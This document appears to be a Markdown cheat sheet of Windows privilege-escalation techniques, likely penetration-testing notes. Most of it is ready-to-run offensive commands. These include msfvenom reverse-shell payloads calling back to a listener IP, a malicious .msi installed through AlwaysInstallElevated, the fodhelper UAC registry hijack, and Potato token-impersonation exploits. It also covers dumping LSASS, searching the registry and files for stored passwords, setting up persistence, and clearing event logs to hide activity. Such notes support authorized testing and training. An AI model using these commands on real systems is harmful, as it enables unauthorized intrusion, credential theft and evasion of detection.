# 🛡️ Windows Privilege Escalation

**Tags:** `#Privesc` `#PrivilegeEscalation` `#Windows`

---

## 🔧 Enumeration Tools

| Tool                                                                                          | Description                                                                              |
| --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **[Seatbelt](https://github.com/GhostPack/Seatbelt)**                                         | 🔍 C# tool for local privilege escalation checks. Identifies security misconfigurations. |
| **[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)**                    | 🧠 Privilege escalation auditing tool for discovering security flaws.                    |
| **[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)** | ⚙️ PowerShell script for detecting and exploiting privilege escalation issues.           |
| **[JAWS](https://github.com/411Hall/JAWS)**                                                   | 🔎 PowerShell 2.0 script for privesc enumeration.                                        |
| **[AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)**           | 🗝️ View effective permissions on files, services, registry keys.                        |
| **[Watson](https://github.com/rasta-mouse/Watson)**                                           | 🩹 Finds missing patches for known privilege escalation exploits.                        |
| **[Sherlock](https://github.com/rasta-mouse/Sherlock)**                                       | 🕵️‍♂️ PowerShell script to identify vulnerable system CVEs.                             |

---

## 💥 Exploit Tools

| Tool                                                          | Description                                                                 |
| ------------------------------------------------------------- | --------------------------------------------------------------------------- |
| **[JuicyPotato](https://github.com/ohpe/juicy-potato)**       | 🥔 COM object impersonation. Requires `SeImpersonatePrivilege`.             |
| **[RoguePotato](https://github.com/antonioCoco/RoguePotato)** | 🥔 NTLM relay abuse on newer versions. Requires DCOM + redirector.          |
| **[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**     | 🖨️ Lightweight SYSTEM escalation via Print Spooler (Win 10+, Server 2019). |

---

## 🥔 Potato Exploits (Token Impersonation)

```powershell
whoami /priv
```

> 🔍 Look for: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`

* **JuicyPotato** – COM object impersonation (Win 7/8.1/2008–2016)
* **RoguePotato** – NTLM relay (newer systems, requires HTTP redirector)
* **PrintSpoofer** – Print Spooler impersonation (Win 10, Server 2019+)

---

## 🧰 Post-Exploitation Tools

| Tool                                                        | Description                                      |
| ----------------------------------------------------------- | ------------------------------------------------ |
| **[Mimikatz](https://github.com/gentilkiwi/mimikatz)**      | 🪪 Dump credentials, manipulate tokens.          |
| **[Nishang](https://github.com/samratashok/nishang)**       | 🧪 PowerShell scripts for recon, backdoors.      |
| **[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)** | 💻 Remote access shell via WinRM.                |
| **[Chisel](https://github.com/jpillora/chisel)**            | 🛠️ TCP tunneling (pivoting / C2 communication). |

---

## 📅 Triage Checklist (Initial Access)

```powershell
whoami /priv
whoami /groups
net localgroup administrators
Get-WmiObject Win32_Service
icacls "C:\Program Files\*"
Get-CimInstance Win32_StartupCommand
```

---

## 🌳 Privilege Escalation Decision Tree

- **Check Privileges**
   - SeImpersonate → JuicyPotato/RoguePotato
   - SeAssignPrimaryToken → Token abuse

- **Check Services**
   - Unquoted paths → Drop payload in writable dir
   - Writable binary → Replace + restart

- **Check Registry**
   - AlwaysInstallElevated enabled? → `.msi` payload

- **Check Scheduled Tasks / WMI Events**
   - Writable / misconfigured → Replace script or command

- **Check Users & Credentials**
   - `reg query` & file search for saved passwords

- **Check DLL hijack paths**

- **Try UAC Bypasses or AppLocker evasion**


## 🔍 Manual Checks & Commands

### 💻 General Notes

> 🎯 **Goal:** Gain access to accounts or systems with **higher privileges**

> 📂 **Writable directories to check:** `C:\Windows\Temp`

---

### 🌐 Network & Routing

```powershell
route print
arp -a
ipconfig /all
```

---

### 🔒 AppLocker

```powershell
Get-AppLockerPolicy -Local
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

---

### 🛡️ Windows Defender

```powershell
Get-MpComputerStatus

$preferences = Get-MpPreference
$preferences.ExclusionPath
$preferences.ExclusionExtension
$preferences.ExclusionProcess
```

---

### 👥 User & Group Enumeration

```powershell
query user
whoami /priv
whoami /groups
net user
net localgroup
```

---

### ⚙️ Processes & Applications

```powershell
tasklist /svc
wmic product get name
netstat -ano
```

---

### 💥 System Info

```powershell
systeminfo
wmic qfe
Get-Hotfix
```

---

### 📂 Environment Variables

```powershell
set
```

---

### 🔐 Search for Stored Credentials

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```powershell
Get-ChildItem -Recurse -Include *.config,*.xml,*.ini,*.txt -Path C:\Users\ -ErrorAction SilentlyContinue | Select-String -Pattern "password", "connectionString"
```

---

## 🔥 Privilege Escalation Techniques

### 🛠️ Unquoted Service Paths

```powershell
Get-WmiObject Win32_Service | Select-String "PathName"
```

> 🧪 Exploit if path has spaces and is not quoted.

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > "C:\Program.exe"
```

---

### 🔧 Writable Service Executables

```powershell
Get-ACL "C:\Path\to\service.exe"
```

---

### 🔑 SeImpersonatePrivilege Abuse

```powershell
whoami /priv | Select-String "SeImpersonatePrivilege"
```

#### 🥔 JuicyPotato

```powershell
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
```

#### 🍠 RoguePotato

```powershell
RoguePotato.exe -r 10.10.14.5 -e "C:\Windows\System32\cmd.exe"
```

#### 🔘 PrintSpoofer

```powershell
PrintSpoofer.exe -i -c cmd.exe
```

---

### 🐍 DLL Hijacking

```powershell
Get-WmiObject Win32_Process | Select CommandLine | Select-String ".dll"
```

---

### ⏰ Modifying Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

---

### 🧪 AlwaysInstallElevated

```powershell
reg query HKCU\...\Installer /v AlwaysInstallElevated
reg query HKLM\...\Installer /v AlwaysInstallElevated
```

> ✅ Both values must be `1` to exploit.

```cmd
msfvenom -p windows/shell_reverse_tcp -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

### 🧨 UAC Bypass (fodhelper method)

```powershell
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
start fodhelper.exe
```

---

## 🧐 BloodHound Tips

```powershell
SharpHound.exe -c all
```

> Look for:
>
> * `GenericAll`
> * `WriteOwner`
> * `AdminTo` chains

---

## 🛠️ Post-Exploitation Actions

### 🩸 Dump LSASS

```powershell
procdump -ma lsass.exe lsass.dmp
```

---

### 🔄 Persistence Ideas

* Registry Run Keys
* Scheduled Tasks
* SYSTEM-level service
* WMI permanent events
* Add user to `Administrators`

---

### 🧹 Covering Tracks

```cmd
wevtutil cl system
rm C:\Program.exe
```

---

## 🪛 UAC Bypass Techniques

| Technique                    | Description                                        | Tool / Example                                            |
| ---------------------------- | -------------------------------------------------- | --------------------------------------------------------- |
| **Event Viewer (fodhelper)** | Auto-elevated binary triggers hijacked reg entry.  | `cmd /c start fodhelper` + reg hijack                     |
| **cmstp**                    | Connection Manager profile abuse.                  | `cmstp.exe /s evil.inf`                                   |
| **sdclt.exe**                | Legacy system restore tool (pre-1803).             | Modify `HKCU\Software\Classes\exefile\shell\open\command` |
| **ComputerDefaults.exe**     | Auto-elevated binary used with reg hijack.         | `ms-settings\shell\open\command`                          |
| **SilentCleanup**            | Hijack run via Task Scheduler with elevated token. | Modify environment PATH variable                          |

---

## 🪙 Loot to Collect

- `SAM`, `SYSTEM`, and `SECURITY` hives
- `lsass.dmp`
- Saved RDP credentials
- Config files with creds (INI, XML, CONFIG)
- Token impersonation dumps

---


## 📊 Cheatsheet

| Tier | Technique                  | Tool              | Notes                                    |
| ---- | -------------------------- | ----------------- | ---------------------------------------- |
| 🟢   | Unquoted Svc Path          | winPEAS, Seatbelt | Easy win, check for space in paths       |
| 🟡   | Token Impersonation        | JuicyPotato       | Needs SeImpersonatePrivilege             |
| 🔴   | DLL Hijacking              | Manual            | Requires hunting for hijack points       |
| 🟠   | AlwaysInstallElevated      | Manual            | Both HKCU & HKLM must be enabled         |
| 🔹   | Writable Binaries/Services | icacls, PowerUp   | Great find if service paths are writable |

---

## 📋 Windows Privilege Escalation Checklist

* [ ] ✅ Run WinPEAS, Seatbelt, Watson, Sherlock
* [ ] 🔍 Check `whoami /priv` for token rights
* [ ] 🛠️ AlwaysInstallElevated + `.msi` exploit
* [ ] 📁 Check writable/unquoted services
* [ ] 🔎 Review scheduled tasks (SYSTEM perms)
* [ ] 🔐 Dump LSASS or extract SAM
* [ ] 🔄 Check for saved credentials
* [ ] 👉 DLL Hijacking / PATH abuse
* [ ] 🔄 Try UAC bypass methods
* [ ] 🍠 Try Potato-based SYSTEM exploits
* [ ] 🪝 Persistence via reg/WMI/Startup
